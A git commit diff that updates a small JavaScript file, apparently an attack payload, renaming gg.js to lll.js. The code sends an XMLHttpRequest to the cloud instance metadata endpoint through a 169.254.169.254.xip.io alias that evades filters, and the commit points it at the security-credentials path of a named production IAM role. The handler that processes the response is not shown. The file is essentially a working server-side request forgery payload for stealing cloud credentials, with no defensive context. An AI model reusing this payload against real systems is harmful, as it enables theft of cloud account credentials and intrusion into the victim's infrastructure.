6ef7920a2af559e6e93f30b73dec3b7c2997e004
mhmh55516 <mhmh55516@gmail.com>
2021-04-28 00:03:22 +0200

    Update and rename gg.js to lll.js

--- lll.js
+++ lll.js
@@ -8,5 +8,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "http://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/"); 
+oReq.open("GET", "http://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/prod-sst-worker-pulse-us-east-1-role"); 
 oReq.send();
